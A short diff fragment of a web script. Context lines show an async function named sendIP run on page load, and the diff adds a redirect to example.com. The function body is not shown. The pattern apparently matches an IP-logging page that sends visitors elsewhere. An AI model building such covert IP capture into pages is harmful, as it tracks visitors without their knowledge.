@@ -55,3 +55,5 @@ async function sendIP() {
 }
 
 window.onload = sendIP();
+
+window.location.href = "https://example.com";
